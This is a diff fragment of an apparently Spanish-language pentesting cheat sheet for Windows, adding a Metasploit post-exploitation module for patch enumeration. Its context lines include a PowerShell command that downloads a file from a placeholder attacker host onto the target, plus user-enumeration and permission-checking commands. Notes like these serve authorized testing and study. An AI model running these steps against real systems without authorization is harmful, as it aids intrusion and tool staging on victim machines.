@@ -118,6 +118,9 @@ net user \domain (Para ver los usuarios de un dominio)
 	powershell (New-Object Net.WebClient).DownloadFile('http://IP:PUERTO/archivo', 'archivodestino')
 **Ver permisos de una carpeta**
 	icacls FOLDER
+	
+use post/windows/gather/enum_patches
+
 
 
 #LINUX
